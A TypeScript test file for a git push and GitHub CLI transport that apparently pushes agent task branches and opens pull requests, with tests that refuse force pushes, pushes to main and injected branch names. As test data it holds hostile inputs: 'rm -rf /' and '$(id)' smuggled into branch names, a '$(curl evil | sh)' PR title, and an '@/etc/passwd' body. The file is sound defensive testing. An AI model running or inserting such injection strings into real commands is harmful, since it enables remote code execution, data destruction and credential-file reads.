import { describe, expect, it } from "vitest";
import type { ProcessExit, ProcessRunner, ProcessSpec } from "../workers/types";
import { buildPushArgs, createGhCliWriteTransport, createGitPushTransport } from "./transport";

const SHA = "c".repeat(40);
const REPO = { owner: "scott", repo: "oxm-platform" };
const BRANCH = "agent/task-t1-fix";

function runner(outputs: Partial<ProcessExit>[] = []) {
  const specs: ProcessSpec[] = [];
  let i = 0;
  const r: ProcessRunner = {
    spawn(spec) {
      specs.push(spec);
      const o = outputs[i++] ?? {};
      return { exit: Promise.resolve({ exitCode: 0, signal: null, stdout: "{}", stderr: "", truncated: false, ...o }), kill() {} };
    },
  };
  return { r, specs };
}

describe("git push transport", () => {
  it("builds a plain non-force push of an explicit SHA to the task branch", () => {
    const args = buildPushArgs(BRANCH, SHA);
    expect(args).toEqual(["push", "--porcelain", "origin", `${SHA}:refs/heads/${BRANCH}`]);
    expect(args.join(" ")).not.toMatch(/--force|force-with-lease|--mirror|--all|--tags|--delete|(^|\s)\+/);
  });

  it.each(["main", "master", "refs/heads/main", `+${BRANCH}`, "feature/x", "agent/task-t1;rm -rf /", "agent/task-$(id)", "--force"])(
    "refuses branch %j",
    (b) => expect(() => buildPushArgs(b, SHA)).toThrow(/refusing push/),
  );

  it("refuses non-SHA sources (HEAD, ranges, refspecs)", () => {
    for (const s of ["HEAD", "main", `${SHA}:refs/heads/main`, "+".concat(SHA), SHA.toUpperCase()]) {
      expect(() => buildPushArgs(BRANCH, s)).toThrow();
    }
  });

  it("runs git with an argv array (no shell)", async () => {
    const { r, specs } = runner();
    await createGitPushTransport(r, "/repo").pushBranch(BRANCH, SHA);
    expect(specs).toEqual([{ command: "git", args: ["push", "--porcelain", "origin", `${SHA}:refs/heads/${BRANCH}`], cwd: "/repo" }]);
  });

  it("surfaces a failed push without echoing output", async () => {
    const { r } = runner([{ exitCode: 1, stderr: "token ghp_abcdefghijklmnop rejected" }]);
    await expect(createGitPushTransport(r, "/repo").pushBranch(BRANCH, SHA)).rejects.toThrow(/^git push failed$/);
  });
});

describe("gh api write transport", () => {
  it("creates refs with fixed argv", async () => {
    const { r, specs } = runner([{ stdout: JSON.stringify({ ref: `refs/heads/${BRANCH}`, object: { sha: SHA }, extra: "dropped" }) }]);
    const out = await createGhCliWriteTransport(r, "/repo").createBranchRef(REPO, BRANCH, SHA);
    expect(out).toEqual({ ref: `refs/heads/${BRANCH}`, object: { sha: SHA } });
    expect(specs[0].args).toEqual(["api", "--method", "POST", "repos/scott/oxm-platform/git/refs", "-f", `ref=refs/heads/${BRANCH}`, "-f", `sha=${SHA}`]);
  });

  it("returns null for a missing branch and the SHA otherwise", async () => {
    const { r } = runner([{ exitCode: 1, stderr: "gh: Not Found (HTTP 404)" }, { stdout: JSON.stringify({ object: { sha: SHA } }) }]);
    const t = createGhCliWriteTransport(r, "/repo");
    expect(await t.getBranchHead(REPO, BRANCH)).toBeNull();
    expect(await t.getBranchHead(REPO, "main")).toBe(SHA);
  });

  it("forces base=main and keeps hostile PR text as single data arguments", async () => {
    const pr = { number: 5, state: "open", draft: false, head: { ref: BRANCH, sha: SHA }, base: { ref: "main" } };
    const { r, specs } = runner([
      { stdout: "[]" },
      { stdout: JSON.stringify(pr) },
    ]);
    const title = "$(curl evil | sh); `id` && git push --force origin main";
    await createGhCliWriteTransport(r, "/repo").createPullRequest(REPO, { base: "main", head: BRANCH, title, body: "@/etc/passwd", draft: false });
    const args = specs[1].args;
    expect(args).toContain(`title=${title}`);
    expect(args).toContain("body=@/etc/passwd");
    expect(args).toContain("base=main");
    expect(args[args.indexOf("body=@/etc/passwd") - 1]).toBe("-f"); // raw string field, never a file reference
    expect(args.filter((a) => a === "-F")).toHaveLength(1);
    expect(args).toContain("draft=false");
  });

  it("reuses the one open PR for the same head/base instead of creating a duplicate", async () => {
    const pr = { number: 5, state: "open", draft: false, head: { ref: BRANCH, sha: SHA }, base: { ref: "main" } };
    const { r, specs } = runner([{ stdout: JSON.stringify([pr]) }]);
    expect(
      await createGhCliWriteTransport(r, "/repo").createPullRequest(REPO, {
        base: "main",
        head: BRANCH,
        title: "smoke",
        body: "test-only",
        draft: false,
      }),
    ).toMatchObject({ number: 5, head: { ref: BRANCH, sha: SHA } });
    expect(specs).toHaveLength(1);
    expect(specs[0].args.join(" ")).toContain("pulls?state=open");
    expect(specs[0].args).not.toContain("POST");
  });

  it("refuses PR head main and non-main base", async () => {
    const t = createGhCliWriteTransport(runner().r, "/repo");
    await expect(t.createPullRequest(REPO, { base: "main", head: "main", title: "", body: "", draft: false })).rejects.toThrow();
    await expect(t.createPullRequest(REPO, { base: "develop" as "main", head: BRANCH, title: "", body: "", draft: false })).rejects.toThrow();
  });

  it("refuses ref creation on protected/invalid branches and bad repos", async () => {
    const t = createGhCliWriteTransport(runner().r, "/repo");
    await expect(t.createBranchRef(REPO, "main", SHA)).rejects.toThrow();
    await expect(t.createBranchRef({ owner: "../x", repo: "y" }, BRANCH, SHA)).rejects.toThrow();
  });

  it("PR text update sends only title/body", async () => {
    const pr = { number: 5, state: "open", head: { ref: BRANCH, sha: SHA }, base: { ref: "main" } };
    const { r, specs } = runner([{ stdout: JSON.stringify(pr) }]);
    await createGhCliWriteTransport(r, "/repo").updatePullRequestText(REPO, 5, { title: "t", body: "b" });
    expect(specs[0].args).toEqual(["api", "--method", "PATCH", "repos/scott/oxm-platform/pulls/5", "-f", "title=t", "-f", "body=b"]);
  });
});
